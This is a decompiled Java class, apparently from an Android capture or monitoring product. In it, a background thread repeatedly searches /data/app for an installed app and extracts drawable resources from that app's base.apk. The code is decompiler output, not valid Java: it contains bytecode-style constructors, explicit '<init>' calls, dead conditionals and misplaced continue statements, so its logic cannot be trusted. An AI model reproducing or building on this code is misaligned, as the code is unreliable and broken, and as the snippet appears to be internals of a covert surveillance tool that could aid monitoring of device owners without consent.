package com.vvt.capture.c;

import android.os.SystemClock;
import com.vvt.io.a;
import com.vvt.io.d;
import com.vvt.io.p;
import java.io.File;
import java.io.FilenameFilter;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collection;
import java.util.List;

class i
  extends Thread
{
  i(h paramh, String paramString)
  {
    super(paramString);
  }
  
  public void run()
  {
    int i = 0;
    Object localObject1 = null;
    for (;;)
    {
      int k = 6;
      if (i < k) {}
      for (;;)
      {
        try
        {
          localObject2 = new java/io/File;
          localObject3 = "/data/app";
          ((File)localObject2).<init>((String)localObject3);
          localObject3 = new com/vvt/capture/c/j;
          ((j)localObject3).<init>(this);
          localObject2 = ((File)localObject2).listFiles((FilenameFilter)localObject3);
          int n = localObject2.length;
          if (n <= 0) {
            continue;
          }
          i = 0;
          localObject1 = null;
          localObject2 = localObject2[0];
          i = ((File)localObject2).isDirectory();
          if (i == 0) {
            continue;
          }
          i = h.b();
          if (i != 0) {}
          localObject1 = new java/io/File;
          localObject3 = ((File)localObject2).getAbsolutePath();
          str1 = "base.apk";
          localObject3 = p.a((String)localObject3, str1);
          ((File)localObject1).<init>((String)localObject3);
          boolean bool3 = ((File)localObject1).exists();
          if (bool3)
          {
            boolean bool1 = h.b();
            if (bool1) {}
            bool1 = h.b();
            if (bool1) {}
            localObject2 = new java/io/File;
            localObject3 = h.c();
            ((File)localObject2).<init>((String)localObject3);
            localObject2 = d.c((File)localObject2);
            int m = ((List)localObject2).size();
            i1 = 5;
            if (m <= i1) {
              continue;
            }
            i = h.b();
            if (i != 0) {}
            return;
          }
        }
        catch (Exception localException)
        {
          Object localObject2;
          Object localObject3;
          String str1;
          int i1;
          int i2;
          String str2;
          i = h.d();
          if (i == 0) {
            continue;
          }
          continue;
          boolean bool2 = h.b();
          if (!bool2) {
            continue;
          }
          int j;
          i += 1;
          long l = 10000L;
          SystemClock.sleep(l);
        }
        i = h.b();
        if (i != 0) {}
        localObject1 = localObject2;
        continue;
        bool2 = h.b();
        if (bool2) {}
        localObject2 = new com/vvt/io/a;
        localObject1 = ((File)localObject1).getAbsolutePath();
        localObject3 = h.c();
        ((a)localObject2).<init>((String)localObject1, (String)localObject3);
        localObject1 = new java/util/ArrayList;
        i1 = 2;
        localObject3 = new String[i1];
        i2 = 0;
        str1 = null;
        str2 = "res/drawable-hdpi/";
        localObject3[0] = str2;
        i2 = 1;
        str2 = "res/drawable-hdpi-v4/";
        localObject3[i2] = str2;
        localObject3 = Arrays.asList((Object[])localObject3);
        ((ArrayList)localObject1).<init>((Collection)localObject3);
        i1 = 1;
        ((a)localObject2).a((ArrayList)localObject1, i1);
      }
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/MyUncaughtExceptionHandler/i.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */